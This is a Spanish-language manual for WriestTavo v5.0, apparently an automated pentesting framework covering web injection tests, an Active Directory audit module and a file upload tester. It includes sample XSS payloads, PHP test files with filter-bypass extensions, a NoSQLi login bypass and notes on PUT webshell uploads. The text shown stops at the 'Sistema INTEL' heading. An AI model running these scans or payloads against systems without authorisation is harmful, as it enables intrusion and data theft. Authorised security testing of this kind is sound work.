# ⚡ WriestTavo v5.0 — Manual Completo
### Bug Bounty · Pentesting · AD Audit · Vuln Analysis · CTF
**By WRIΞSTTAV0**

---

> ⚠️ **AVISO LEGAL**: Este script debe usarse ÚNICAMENTE en sistemas con autorización explícita del propietario. El uso no autorizado es ilegal. Solo para entornos propios, Bug Bounty con scope definido, o auditorías con contrato firmado.

---

## 📋 Tabla de Contenidos

1. [¿Qué es WriestTavo?](#qué-es-wriestTavo)
2. [Novedades v5.0](#novedades-v50)
3. [Instalación y Requisitos](#instalación-y-requisitos)
4. [Primeros Pasos](#primeros-pasos)
5. [Modos de Escaneo](#modos-de-escaneo)
6. [Menú de Presets](#menú-de-presets)
7. [Los 47 Módulos — Referencia Completa](#los-47-módulos)
8. [Módulo 0: CDN/Proxy Detection](#módulo-0-cdnproxy-detection)
9. [Módulo 45: ADPulse — Active Directory Auditor](#módulo-45-adpulse)
10. [Módulo 46: File Upload Vulnerability Tester](#módulo-46-file-upload)
11. [Sistema de Sesión — .wtsession](#sistema-de-sesión)
12. [Sistema INTEL — Inteligencia Compartida](#sistema-intel)
13. [Sistema de Reportes — 4 Tipos](#sistema-de-reportes)
14. [Sistema de Actualización — 11 Fuentes](#sistema-de-actualización)
15. [Agregar Payloads Propios](#agregar-payloads-propios)
16. [Catálogo de Payloads Modernos](#catálogo-de-payloads-modernos)
17. [Agregar Módulos Propios](#agregar-módulos-propios)
18. [Exploit Intelligence — EDB + NVD + GHSA](#exploit-intelligence)
19. [Flujo Completo de Trabajo](#flujo-completo-de-trabajo)
20. [Comandos de Referencia Rápida](#comandos-de-referencia-rápida)
21. [Estructura de Archivos](#estructura-de-archivos)
22. [Preguntas Frecuentes](#preguntas-frecuentes)

---

## ¿Qué es WriestTavo?

WriestTavo es un **framework de pentesting automatizado** con 47 módulos que cubren el stack tecnológico moderno completo. No es solo un escáner — es un sistema de **inteligencia compartida**: cada módulo aprende del anterior y adapta sus técnicas automáticamente.

```
Scanner normal:       WriestTavo:
  Escanea → reporta    CDN detect → aprende → adapta → escala → reporta + .wtsession

  Sin contexto         whatweb detecta Laravel
                            ↓
                       gobuster usa wordlist Laravel
                            ↓
                       LFI busca /.env, /storage/logs/
                            ↓
                       SSTI prueba payloads Blade/Twig
                            ↓
                       File Upload prueba rutas detectadas
                            ↓
                       EDB busca "laravel" en exploits
                            ↓
                       ADPulse audita si detecta DC/LDAP
                            ↓
                       3 reportes + .wtsession para reanudar
```

### Cobertura del Stack Moderno

| Categoría | Tecnologías Cubiertas |
|-----------|----------------------|
| **Frontend** | React, Next.js, Vue, Nuxt, Angular, Svelte/Kit, Astro, Remix |
| **Backend** | PHP/Laravel/Symfony, Node.js/Express/NestJS, Python/Django/Flask/FastAPI, .NET/ASP.NET Core, Ruby on Rails, Java/Spring/Tomcat |
| **CMS** | WordPress, Joomla, Drupal, Magento |
| **Bases de datos** | MySQL, PostgreSQL, MongoDB, Redis, Elasticsearch |
| **Servidores** | Apache, Nginx, IIS (Windows), Caddy |
| **Cloud/Infra** | Docker, Kubernetes, AWS/GCP/Azure metadata, Prometheus, Grafana |
| **APIs** | REST, GraphQL, Swagger/OpenAPI, FastAPI /docs, gRPC básico |
| **Active Directory** | Kerberoasting, AS-REP, ADCS ESC1/ESC2, Delegation, LAPS, SMB Signing, GPOs |
| **CDN/Proxy** | Cloudflare, Akamai, Fastly, AWS CloudFront, Azure CDN, Vercel, Netlify |

---

## Novedades v5.0

### 🔍 Pre-Scan CDN/Proxy Detection (Módulo 0)

Antes de gastar tiempo en nmap, el script detecta automáticamente si el target está detrás de un CDN/proxy. Evita scans de 11 minutos contra IPs de Cloudflare/Vercel que no son el servidor real.

- Detecta: Cloudflare, Akamai, Fastly, AWS CloudFront, Azure CDN, Vercel, Netlify, Squid
- Métodos: headers HTTP + whois de IP
- Si detecta CDN → aviso en terminal, adapta estrategia, busca IP de origen vía DNS leaks
- Registra en reporte: "los puertos son del proxy CDN, no del servidor real"

### 📤 Módulo 46 — File Upload Vulnerability Tester

Prueba automática de endpoints de carga de archivos con 4 tipos de archivo. **El script crea los archivos de prueba automáticamente** — no necesitas crearlos manualmente.

### 💾 Sistema de Sesión — .wtsession

Al terminar cada scan se genera un archivo `.wtsession` que permite **reanudar y mejorar** scans futuros del mismo target. Ver sección completa más adelante.

### 🚀 nmap Significativamente Más Rápido

Problema raíz identificado: nmap reintentaba cada puerto filtrado **10 veces** por defecto. Con firewalls que dropean silenciosamente, esto multiplicaba el tiempo por 10.

| Modo | `--max-retries` | RTT | Velocidad |
|------|----------------|-----|-----------|
| `stealth` | 2 | 200ms–1000ms | Controlada, evasión IDS |
| `normal` | 1 | 100ms–500ms | ~5-10× más rápido |
| `aggressive` | 0 | 50ms–200ms | Máxima velocidad |

Además: `--host-timeout 5m` en version scan y vuln scan — ya no se cuelgan indefinidamente.

### 🔧 Sistema de Actualización — 11 Fuentes de Inteligencia

El `--update` pasó de 5 fuentes a 11:

| # | Fuente | Qué actualiza |
|---|--------|---------------|
| 1 | Nuclei Templates (projectdiscovery) | 9000+ templates CVE/misconfigs |
| 2 | NVD/NIST | Base oficial CVEs con CVSS |
| 3 | **CISA KEV** ⭐ | CVEs explotados ACTIVAMENTE ahora |
| 4 | **EPSS** ⭐ | % probabilidad de explotación en 30 días |
| 5 | Exploit-DB | PoCs listos, shellcodes |
| 6 | Packet Storm | Advisories, 0-days |
| 7 | GitHub Advisories | Vulns en npm/pip/composer/maven |
| 8 | OSV (Google) | PyPI/npm/Rust/Go/PHP/Maven |
| 9 | WPScan DB | WordPress plugins/themes (API key gratuita) |
| 10 | SecLists + PayloadsAllTheThings | Wordlists y payloads |
| 11 | Auto-update script | Nueva versión del script si disponible |

> **CISA KEV**: Lista de vulnerabilidades que el gobierno de USA obliga a parchear. Si aparece aquí, alguien la está explotando activamente ahora mismo.

> **EPSS**: Score 0-100% de probabilidad de ser explotada en los próximos 30 días. Más útil que CVSS para priorizar.

### 🛠️ Mejoras de Calidad

- **`dedup_array`**: Función genérica que limpia duplicados en todos los arrays INTEL. El reporte ya no repite "PHP PHP nodejs nodejs"
- **`has_cmd`**: Reemplaza todos los `command -v` inline — código más limpio
- **`find_wordlist`**: Busca wordlists en múltiples rutas estándar de Kali/Debian automáticamente
- **`on_tool_error`**: Registra en el reporte cuando una herramienta falla con su exit code
- **`trap Ctrl+C`**: Al interrumpir el scan, mata Wave2/Wave3 background limpiamente
- **Dedup de hallazgos**: `add_finding` ya no duplica el mismo hallazgo si dos módulos lo detectan
- **Spinner seguro**: No deja procesos zombie si un módulo falla

### 🐛 Bugs Corregidos

| Bug | Fix |
|-----|-----|
| Wave 3 se lanzaba DOS veces (resultados corruptos) | `if/else` garantiza exactamente 1 proceso |
| `modulo_adpulse` definida dos veces | Primera definición duplicada eliminada |
| `modulo_adpulse` llamada dos veces en pipeline | Primera llamada duplicada eliminada |
| Menu `case 45` duplicado en misma línea | Dedup + case 46 (File Upload) agregado |
| WPScan lanzaba spinner aunque lo saltara | Guard corregido, sale limpio |
| Arrays del `.wtsession` sin escapar (payloads XSS con `<>` rompían el archivo) | `_write_bash_array` escapa comillas simples |
| Sesión cargaba datos de otro target sin avisar | Valida `SES_TARGET == TARGET`, limpia payloads si no coincide |
| `_merge_arrays` usaba `local -n` (bash 4.3+ only) | Reescrita con `eval`, compatible bash 3.x+ |
| `is_web_port` tenía 8888 duplicado | Segundo `8888` → `8008` |

---

## Instalación y Requisitos

### Instalación Automática

```bash
sudo ./wriestTavo.sh --install
```

Instala automáticamente: nmap, curl, python3, whatweb, nikto, gobuster, wafw00f, sslscan, nuclei, dnsrecon, subfinder, ffuf, sqlmap, wpscan, commix, arjun, crackmapexec, enum4linux-ng, snmp, smtp-user-enum, exploitdb, seclists, wordlists, dalfox, masscan

### Instalación Manual

```bash
# Core
sudo apt update && sudo apt install -y nmap masscan curl python3 python3-pip git

# Detección CDN y resolución DNS (nuevo en v5.0)
sudo apt install -y dnsutils whois

# Web scanning
sudo apt install -y whatweb nikto gobuster wafw00f sslscan nuclei

# Recon OSINT
sudo apt install -y dnsrecon subfinder
pip3 install theHarvester --break-system-packages

# Fuzzing y análisis
sudo apt install -y ffuf sqlmap wpscan commix
pip3 install arjun --break-system-packages

# Infra / Red Team
sudo apt install -y crackmapexec enum4linux-ng snmp smtp-user-enum

# Exploit DB local
sudo apt install -y exploitdb   # incluye searchsploit

# Payloads (nuevo en v5.0 — para auto-integración)
sudo apt install -y seclists wordlists
git clone https://github.com/swisskyrepo/PayloadsAllTheThings \
    ~/.wriestTavo/PayloadsAllTheThings

# XSS avanzado
go install github.com/hahwul/dalfox/v2@latest
```

### Instalación Extra para ADPulse (Módulo 45)

```bash
# LDAP — requerido para ADPulse
sudo apt install -y ldap-utils

# Impacket — para attack chains en Reporte Pentester
sudo apt install -y python3-impacket
# o la versión más actualizada:
pip3 install impacket --break-system-packages

# BloodHound Python — recolección automática desde ADPulse
pip3 install bloodhound --break-system-packages

# Certipy — ADCS attack chains
pip3 install certipy-ad --break-system-packages

# BloodHound GUI (para analizar los datos recolectados)
sudo apt install -y bloodhound neo4j
```

### WPScan API Key (para Módulo 46 — File Upload / WPScan DB en --update)

```bash
# Gratis en: https://wpscan.com/api
echo 'TU_API_KEY_AQUI' > ~/.wriestTavo/wpscan_api_key.txt
```

### Verificar que todo está instalado

```bash
sudo ./wriestTavo.sh --install
# Al terminar muestra qué herramientas están disponibles y cuáles faltan
```

---

## Primeros Pasos

```bash
# 1. Instalar dependencias
sudo ./wriestTavo.sh --install

# 2. Actualizar BD de exploits, CVEs y payloads (11 fuentes)
sudo ./wriestTavo.sh --update

# 3. (Opcional) Configurar auto-actualización diaria
sudo ./wriestTavo.sh --cron

# 4. Primer scan
sudo ./wriestTavo.sh 192.168.1.100
# → Al lanzar aparece el menú de presets
```

### Ejemplos de uso rápido

```bash
sudo ./wriestTavo.sh 192.168.1.100                   # IP directa
sudo ./wriestTavo.sh https://app.ejemplo.com          # HTTPS con ruta
sudo ./wriestTavo.sh --mode stealth target.com        # Silencioso (WAF bypass)
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X     # Agresivo (CTF/HTB)
sudo ./wriestTavo.sh -o /tmp/mi_scan target.com       # Output en directorio custom

# Reanudar/mejorar un scan previo con sesión guardada
sudo ./wriestTavo.sh --session wriestTavo_results/target_com.wtsession target.com
```

---

## Modos de Escaneo

| Modo | Port Scan | `--max-retries` | RTT | Delay | Ideal para |
|------|-----------|----------------|-----|-------|-----------|
| `normal` | top-1000 | 1 | 100–500ms | Sin delay | Pentesting general |
| `stealth` | top-500 | 2 | 200ms–1s | +delay WAF | Bug Bounty, producción |
| `aggressive` | todos (-p-) | 0 | 50–200ms | Sin delay | CTF, HTB, lab |

```bash
sudo ./wriestTavo.sh --mode stealth https://target.com
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
```

> **¿Por qué ahora es más rápido?** nmap por defecto reintentaba cada puerto filtrado 10 veces. Con `--max-retries 1` en modo normal, si el firewall dropea silenciosamente, se intenta solo una vez. En targets con muchos puertos filtrados la diferencia puede ser de 50 minutos a 5 minutos.

---

## Menú de Presets

```
  ╔═══ WriestTavo v5.0 — 47 módulos ═══╗
  ║  [1] Full Scan (47 módulos, 7 fases)  ║
  ║  [2] Recon OSINT          (pasivo)    ║
  ║  [3] Web + SSL                        ║
  ║  [4] Bug Bounty Pro                   ║
  ║  [5] Injection Suite                  ║
  ║  [6] API Modern                       ║
  ║  [7] Windows/Infra + AD               ║
  ║  [8] Framework Deep                   ║
  ║  [9] WordPress                        ║
  ║ [10] CTF/HTB Mode                     ║
  ║ [11] Custom (elegir módulos 1-46)     ║
  ╚═════════════════════════════════════╝
```

| Preset | Módulos incluidos | Uso típico |
|--------|-------------------|-----------| 
| **[1] Full Scan** | Los 47 módulos en 7 fases incluyendo ADPulse y File Upload | Auditoría completa |
| **[2] Recon OSINT** | crtsh + theHarvester + dnsrecon | Reconocimiento 100% pasivo |
| **[3] Web + SSL** | WAF + nikto + nuclei + gobuster + sslscan | Web rápido |
| **[4] Bug Bounty Pro** | Recon + web + injection + CORS + JWT + SSRF + EDB | Bug bounty |
| **[5] Injection Suite** | SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CMDi | Testing de inyecciones |
| **[6] API Modern** | Endpoints + GraphQL + Swagger + JWT + CORS | APIs REST/GraphQL |
| **[7] Windows/Infra + AD** | IIS + SMB + Docker + K8s + SNMP + **ADPulse** | Entornos Windows/AD |
| **[8] Framework Deep** | framework_scan + SSTI + rutas críticas | Laravel/Django/Rails |
| **[9] WordPress** | wpscan + nuclei + gobuster + SQLi + XSS | Auditoría WordPress |
| **[10] CTF/HTB** | Todos los módulos modo agresivo incluyendo ADPulse | CTF/laboratorio |
| **[11] Custom** | Elegir módulos 1-46 individualmente | Manual / targeted |

---

## Los 47 Módulos

### PRE-SCAN: CDN/Proxy Detection

| # | Módulo | Qué hace |
|---|--------|----------|
| 0 | `cdn_detect` | Detecta CDN/proxy ANTES de nmap. Adapta estrategia. Busca IP de origen. |

### FASE 1: Reconocimiento Pasivo

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 26 | `crtsh` | Subdominios desde Certificate Transparency logs. 100% pasivo. | `INTEL_SUBDOMAINS[]` |
| 17 | `theharvester` | Emails, IPs, subdominios desde Google, Bing, urlscan. | `INTEL_SUBDOMAINS[]` |
| 18 | `dnsrecon` | Zone transfer, SPF, DMARC, MX, fuerza bruta DNS. | `INTEL_SERVICES[]` |

### FASE 2: Infraestructura

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 1 | `ttl_os` | Detecta OS por TTL (64=Linux, 128=Windows). | `INTEL_OS` |
| 2 | `port_scan` | nmap TCP 3-waves progresivas. Detecta puertos web, SMB, LDAP, etc. | `WEB_PORTS[]`, activa módulos condicionalmente |
| 3 | `version_scan` | Versiones exactas de servicios. | `INTEL_TECHNOLOGIES[]` |
| 38 | `infra_exposure` | Docker API, Kubernetes, Prometheus, Grafana sin auth. | `INTEL_DOCKER_EXPOSED`, `INTEL_K8S_EXPOSED` |

### FASE 3: Servicios de Red

| # | Módulo | Qué hace | Se activa cuando |
|---|--------|----------|-----------------| 
| 10 | `smb` | SMB null sessions, shares, enum4linux-ng. | Puerto 445/139 |
| 29 | `cme` | CrackMapExec: SMB signing, LDAP, WinRM. | Puerto 445/389/5985 |
| 28 | `snmp` | Community strings por defecto. | Puerto 161 |
| 27 | `smtp_enum` | Enumera usuarios con VRFY sin autenticación. | Puerto 25/465/587 |
| 9 | `subdominios` | Fuerza bruta subdominios con subfinder/amass. | Siempre si es dominio |

### FASE 4: Fingerprinting Web

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 4 | `waf` | Detecta WAF (Cloudflare, Akamai, AWS WAF, F5…). Ajusta delay automáticamente. | `INTEL_WAF_DETECTED`, `INTEL_SCAN_DELAY` |
| 5 | `http_headers` | CSP, HSTS, X-Frame-Options, cookies sin flags, server version. | `INTEL_TECHNOLOGIES[]` |
| 19 | `sslscan` | TLS/SSL: versiones obsoletas, ciphers débiles, Heartbleed, cert expirado. | Solo si puerto 443/8443 |
| 6 | `whatweb` | CMS, framework, librerías. 50+ tecnologías detectadas. | `INTEL_CMS`, `INTEL_FRAMEWORK_*` |
| 25 | `wpscan` | Usuarios, plugins, themes WordPress con CVEs. | Solo si `INTEL_CMS=wordpress` |
| 7 | `nikto` | Vulnerabilidades web conocidas genéricas. | `INTEL_NIKTO_FINDINGS` |

### FASE 5: Escaneo Profundo

| # | Módulo | Qué hace | Se adapta según |
|---|--------|----------|----------------|
| 20 | `nuclei` | 9000+ templates: CVEs, misconfigs, exposures. Estándar bug bounty. | `INTEL_CMS` → templates específicos |
| 30 | `framework_scan` | Rutas críticas del framework: `.env`, `/telescope`, `/_next/`, `/actuator`, etc. | `INTEL_FRAMEWORK_*` |
| 8 | `gobuster` | Fuerza bruta directorios. Wordlist según CMS detectado. | `INTEL_WORDLIST_EXTRA` por CMS |
| 24 | `arjun` | Descubre parámetros GET/POST ocultos: debug, admin, cmd, file, redirect. | → `INTEL_INJECTABLE_URLS[]` |
| 15 | `endpoints` | Endpoints API: `/api/v1/`, `/graphql`, `/swagger`, `/actuator`. | `INTEL_GRAPHQL_URL`, `INTEL_SWAGGER_URL` |
| 16 | `js_analysis` | Secrets, JWTs, API keys en JS bundles. | `INTEL_JWT_TOKENS[]`, `INTEL_JS_SECRETS[]` |
| **46** | **`fileupload`** | **Prueba upload en rutas detectadas. Notifica RCE si PHP se ejecuta.** | `INTEL_SENSITIVE_PATHS[]`, `INTEL_API_ENDPOINTS[]` |

### FASE 6: Vulnerabilidades Web

| # | Módulo | Qué hace | Se activa/adapta cuando |
|---|--------|----------|------------------------|
| 13 | `sqli` | SQLi básico: errores, time-based. Payloads por DB detectada. | `INTEL_INJECTABLE_URLS[]` |
| 21 | `sqlmap` | Confirma y explota SQLi. `--tamper` si hay WAF. | **Solo si** `INTEL_SQLI_FOUND=true` |
| 36 | `nosqli` | MongoDB injection: `{$gt:""}`, bypass de login. | Si MongoDB en `INTEL_TECHNOLOGIES` |
| 14 | `xss` | XSS reflejado en parámetros. | `INTEL_INJECTABLE_URLS[]` |
| 22 | `dalfox` | XSS avanzado: DOM-based, Header-based, CSP bypass. | Profundiza módulo 14 |
| 23 | `commix` | Command injection / OS RCE. | `INTEL_INJECTABLE_URLS[]` |
| 31 | `lfi` | LFI/Path Traversal. Escala: LFI → RFI → PHP wrappers → log poisoning. | Payloads de `INTEL_EXTRA_PAYLOADS_LFI[]` |
| 32 | `ssrf` | SSRF. Si confirma → prueba AWS/GCP/Azure metadata automáticamente. | `INTEL_INJECTABLE_URLS[]` |
| 33 | `ssti` | Template injection: Jinja2, Twig, Blade, Smarty, ERB. RCE si confirma. | `INTEL_FRAMEWORK_BACKEND` con engine |
| 34 | `cors` | CORS misconfig. **Genera cors_poc.html automáticamente.** | → `INTEL_CORS_VULN=true` |
| 35 | `jwt` | Analiza JWTs: alg:none, RS256→HS256, crack con hashcat. | `INTEL_JWT_TOKENS[]` de módulo 16 |
| 39 | `xxe` | XXE en APIs XML, SOAP, SVG upload. | `INTEL_TECHNOLOGIES` con java/php/.net |
| 40 | `idor_redirect` | IDOR en IDs incrementales. Open Redirect en parámetros de redirect. | `INTEL_API_ENDPOINTS[]` |
| 41 | `iis_windows` | ShortName 8.3, WebDAV, NTLM exposure, ViewState sin MAC. | Solo si `INTEL_OS=windows` |
| 37 | `http_methods` | PUT, DELETE, TRACE, CONNECT. PUT → intenta subir webshell de prueba. | Todos los targets web |

### FASE 7: Post-Scan

| # | Módulo | Qué hace |
|---|--------|----------|
| 43 | `edb_intel` | Exploit Intelligence: EDB local + NVD CVEs (CVSS≥9) + GHSA + CISA KEV + EPSS |
| 11 | `vuln_scan` | nmap NSE vuln scripts sobre puertos detectados |
| 12 | `searchsploit` | Busca exploits para versiones exactas detectadas |
| 44 | `edb_search` | Búsqueda manual interactiva en EDB + NVD + GHSA |
| **45** | **`adpulse`** | **ADPulse: 35 checks de seguridad en Active Directory (LDAP solo lectura)** |

---

## Módulo 0: CDN/Proxy Detection

Corre **antes de todo** — antes de Fase 1, antes de nmap. Si el target está detrás de un CDN, todos los puertos que nmap reporta son del proxy, no del servidor real.

### ¿Qué detecta?

| CDN/Proxy | Método de detección |
|-----------|-------------------|
| Cloudflare | Header `cf-ray` o header `cloudflare` |
| Akamai | Headers `x-akamai`, `x-check-cacheable` |
| Fastly | Headers `x-fastly`, `x-served-by` |
| AWS CloudFront | Headers `x-amz-cf-id`, `via: cloudfront` |
| Azure CDN | Headers `x-azure-ref` |
| Vercel | Header `x-vercel-id` |
| Netlify | Header `x-nf-request-id` |
| Cualquiera | whois de la IP resuelta |

### Qué hace cuando lo detecta

```
  ┌─────────────────────────────────────────────────────┐
  │  ⚠️  CDN/PROXY DETECTADO: Cloudflare               │
  │  IP resuelta: 104.21.x.x (IP del proxy, no origin) │
  │                                                     │
  │  Impacto en el scan:                                │
  │  • nmap verá puertos del CDN, no del servidor real  │
  │  • Wave 3 (-p-) será menos informativa              │
  │  • Foco: recon web, headers, JS, subdominios        │
  │  • Intentar encontrar IP de origen                  │
  └─────────────────────────────────────────────────────┘
```

Automáticamente busca la IP de origen probando subdominios que frecuentemente apuntan directo al servidor: `direct.`, `origin.`, `backend.`, `api.`, `mail.`, `ftp.`, `smtp.`, `cpanel.`

Si encuentra una IP diferente a la del CDN, la reporta como **hallazgo ALTO** con sugerencia de escanear esa IP directamente.

---

## Módulo 45: ADPulse

ADPulse es el auditor de Active Directory integrado en WriestTavo. Usa una conexión **LDAP de solo lectura** — no modifica ningún objeto del directorio.

### Activación

```bash
# Desde el menú
sudo ./wriestTavo.sh 192.168.1.10   # IP del Domain Controller
# → [45] ADPulse Audit  (o [7] Windows/Infra, [10] CTF/HTB)

# Al ejecutarse pide 3 datos:
#   IP del DC: 192.168.1.10
#   Dominio FQDN: corp.local
#   Usuario: ldapuser
#   Contraseña: ****
```

### Los 35 Checks

| # | Check | Severidad | Técnica de Ataque Relacionada |
|---|-------|-----------|-------------------------------|
| 1 | Null Bind LDAP | 🔴 CRÍTICO | Enumeración anónima |
| 2 | **Kerberoasting** (SPNs) | 🔴 CRÍTICO | Crack offline de TGS hashes |
| 3 | **AS-REP Roasting** | 🔴 CRÍTICO | Crack offline sin preauth |
| 4 | **Unconstrained Delegation** | 🔴 CRÍTICO | Robo de TGT de DA |
| 5 | Constrained Delegation | 🟠 MEDIO | S4U2Self/S4U2Proxy abuse |
| 6 | Grupos privilegiados (DA/EA/SA) | 🟠 ALTO | Inventario de targets |
| 7 | **KRBTGT password age** | 🔴 CRÍTICO | Golden Ticket persistence |
| 8 | Contraseñas sin expiración | 🟡 BAJO | Password spray |
| 9 | Cuentas inactivas >90 días | 🟠 MEDIO | Cuentas abandonadas |
| 10 | Política de contraseñas débil | 🟠 ALTO | Password spraying |
| 11 | adminCount=1 huérfano (SDProp) | 🟠 ALTO | ACL abuse |
| 12 | **Contraseñas en Description** | 🔴 CRÍTICO | Credenciales en texto claro |
| 13 | DCSync permissions | 🔴 CRÍTICO | Dump de hashes NTLM |
| 14 | **LAPS** no instalado | 🟠 ALTO | Lateral movement por admins locales |
| 15 | **ADCS ESC1** | 🔴 CRÍTICO | Impersonation de cualquier usuario |
| 16 | **ADCS ESC2** (Any Purpose EKU) | 🔴 CRÍTICO | Certificado para cualquier uso |
| 17 | Guest account habilitado | 🟠 ALTO | Reconocimiento inicial |
| 18 | **SMB Signing no requerido** | 🔴 CRÍTICO | NTLM Relay attack |
| 19 | LDAP Signing no enforced | 🟠 MEDIO | LDAP Relay |
| 20 | Protected Users group vacío | 🟠 MEDIO | Pass-the-Hash/Ticket |
| 21 | Domain Trusts bidireccionales | 🟠 ALTO | Cross-domain attack |
| 22 | GPOs — enumeración | ℹ INFO | GPO abuse |
| 23 | Sin Fine-Grained PSO | 🟡 BAJO | Password spray facilitado |
| 24 | Nivel funcional obsoleto | 🟠 MEDIO | Funciones de seguridad deshabilitadas |
| 25 | **MachineAccountQuota > 0** | 🟠 ALTO | RBCD attack sin credenciales de servicio |
| 26 | Grupos nested en Domain Admins | 🟠 ALTO | Escalada indirecta |
| 27 | Domain Admins con email | 🟠 MEDIO | Phishing de cuentas privilegiadas |
| 28 | AD Recycle Bin deshabilitado | 🟡 BAJO | No recovery de objetos |
| 29 | Sin GPO de auditoría avanzada | 🟠 MEDIO | Ataques sin detección |
| 30 | **PASSWD_NOTREQD activo** | 🔴 CRÍTICO | Cuentas con contraseña vacía |
| 31 | BloodHound — recolección | ℹ INFO | Análisis visual de attack paths |
| 32 | Impacket disponible | ℹ INFO | Verificación de tooling |
| 33 | Dump completo usuarios | ℹ INFO | → `all_users.txt` |
| 34 | Dump completo grupos | ℹ INFO | → `all_groups.txt` |
| 35 | Dump completo equipos | ℹ INFO | → `all_computers.txt` |

---

## Módulo 46: File Upload

Prueba endpoints de carga de archivos descubiertos durante el scan. Si logra subir un archivo, **notifica inmediatamente en terminal** con un banner rojo y lo registra en el reporte como hallazgo CRÍTICO.

### Los 4 archivos de prueba

> ⚠️ **El script los crea automáticamente** — no necesitas crear ningún archivo manualmente.

| Archivo | Contenido | Propósito |
|---------|-----------|-----------|
| `prueba_upload.txt` | `prueba de post en sitio` | Verificar upload básico de texto plano |
| `prueba_upload.php` | `<?php echo "prueba de post en sitio"; ?>` | Detectar RCE — si el servidor lo ejecuta, es criticidad 10.0 |
| `prueba_upload.jpg` | `prueba de post en sitio` (texto) | Bypass de filtros por extensión (extensión .jpg, contenido texto) |
| `prueba_upload.php.jpg` | `<?php echo "prueba de post en sitio"; ?>` | Bypass de filtros con doble extensión |

Los archivos se guardan en `wriestTavo_results/fileupload/` como evidencia.

### Endpoints que prueba

Usa las rutas detectadas por gobuster/nuclei **más** rutas comunes genéricas:

```
/upload  /uploads  /api/upload  /api/v1/upload  /api/v2/upload
/api/files  /media/upload  /media  /files/upload  /admin/upload
/admin/media  /user/avatar  /profile/avatar  /attachments
/documents  /images/upload  /assets/upload  /import  /bulk/import
/wp-content/uploads  /wp-json/wp/v2/media  (si WordPress)
/api/media  /api/attachments  /v1/files  /v2/files  ...y más
```

### Cómo se ve en terminal cuando encuentra una vulnerabilidad

```
  ╔══════════════════════════════════════════════════════════╗
  ║  🚨 FILE UPLOAD EXITOSO — VULNERABILIDAD CRÍTICA         ║
  ╠══════════════════════════════════════════════════════════╣
  ║  Endpoint : https://target.com/api/upload
  ║  Archivo  : prueba_upload.php (application/x-php)
  ║  Razón    : HTTP 200 + URL del archivo en respuesta ✓ VERIFICADO
  ║  URL subida: https://target.com/uploads/prueba_upload.php
  ╚══════════════════════════════════════════════════════════╝
```

Si además el PHP se ejecuta:
```
  🔥 EJECUCIÓN PHP CONFIRMADA en: https://target.com/uploads/prueba_upload.php
```
→ Se registra un segundo hallazgo: **RCE — Ejecución de PHP via File Upload** con CVSS 10.0.

### Cómo se detecta el éxito

El módulo considera upload exitoso si:
1. HTTP 200/201/202 **+** URL del archivo en el body de respuesta (JSON con `url`, `path`, `file`, `location`, `src`)
2. HTTP 200/201/202 **+** JSON con `"success": true` o `"status": "ok"`
3. Redirect post-upload a URL que contiene `success`, `uploaded`, `done`, `media` o `files`

En todos los casos intenta **verificar** que el archivo es accesible haciendo GET a la URL detectada.

### Desde el menú custom

```bash
sudo ./wriestTavo.sh target.com
# → [11] Custom → [46] File Upload Test
```

---

## Sistema de Sesión

Al terminar cada scan, WriestTavo genera automáticamente un archivo `.wtsession`. Este archivo permite que el próximo scan del mismo target **empiece donde terminó el anterior** — más rápido, más inteligente, sin repetir trabajo.

### Flujo de vida

```
Scan 1 (sin sesión):
  sudo ./wriestTavo.sh diablos.com.mx
  → Al terminar genera: wriestTavo_results/diablos_com_mx.wtsession

Scan 2 (con sesión):
  sudo ./wriestTavo.sh --session wriestTavo_results/diablos_com_mx.wtsession diablos.com.mx
  → Carga todo lo conocido, salta lo que no cambió, prioriza lo que funcionó
  → Al terminar actualiza el mismo .wtsession
```

### Qué carga la sesión

Al arrancar con `--session` muestra un banner y aplica:

```
  ╔══════════════════════════════════════════════════════╗
  ║  📂 CARGANDO SESIÓN PREVIA                          ║
  ║  diablos_com_mx.wtsession                           ║
  ╚══════════════════════════════════════════════════════╝
  Puertos restaurados: 80,443  (Wave 1 confirmará cambios)
  Payloads XSS exitosos previos: 2 → al frente de la cola
  ┄ Sesión #2 — 23 hallazgos previos conocidos ┄
    Vulns confirmadas en scans anteriores: XSS CORS
```

| Sin sesión | Con sesión |
|-----------|-----------|
| Port scan desde cero | Puertos conocidos pre-cargados, Wave 1 solo confirma cambios |
| Fingerprinting completo | Stack ya conocido → salta directo a ataques |
| SSL scan completo | Si SSL fue OK y no cambió → skipped |
| Todos los payloads en orden | Payloads exitosos previos van **primero** en la cola |
| Sin contexto de parámetros | Parámetros vulnerables conocidos → atacados de inmediato |
| 0 hallazgos previos | Sabe que existe XSS/CORS → va directo a confirmar/escalar |

### Qué guarda el .wtsession

```bash
# Ejemplo de archivo generado (bash sourceable):
SES_TARGET="diablos.com.mx"
SES_SCAN_COUNT=3
SES_LAST_SCAN="2026-03-04 22:15"
SES_FIRST_SCAN="2026-03-01"
SES_PREV_FINDINGS_COUNT=23

SES_PREV_PORTS="80,443"
SES_PREV_OS="linux"
SES_PREV_WAF=""
SES_PREV_STACK=("nextjs" "vercel" "nodejs")
SES_PREV_VULNS=("XSS" "CORS")

SES_PRIORITY_XSS=('<svg onload=alert(1)>' '<img src=x onerror=alert(1)>')
SES_PRIORITY_SQLI=()
SES_PRIORITY_LFI=()
SES_PRIORITY_SSRF=()

SES_PREV_ENDPOINTS=("/api/user" "/api/auth" "/graphql")
SES_PREV_SENSITIVE=("/.env" "/_next/static/chunks/")

# 2026-03-01 10:00 | scan #1 | 0 vulns | 5 hallazgos
# 2026-03-03 14:22 | scan #2 | 1 vulns | 18 hallazgos
# 2026-03-04 22:15 | scan #3 | 2 vulns | 23 hallazgos
```

### Comandos de sesión

```bash
# Usar sesión existente
sudo ./wriestTavo.sh --session wriestTavo_results/target_com.wtsession target.com

# Ver perfil de sesión sin escanear
cat wriestTavo_results/target_com.wtsession

# Compartir sesión con otro pentester
cp wriestTavo_results/target_com.wtsession /tmp/
# → El otro pentester arranca con todo el contexto acumulado

# La sesión se actualiza automáticamente al terminar cada scan
# No hay flag especial para guardar — siempre se guarda
```

> **Seguridad**: Si pasas una sesión de un target diferente al actual, el script detecta el mismatch, avisa en terminal y limpia los payloads específicos (mantiene puertos/stack que pueden ser informativos, pero no aplica payloads de otro target).

---

## Sistema INTEL

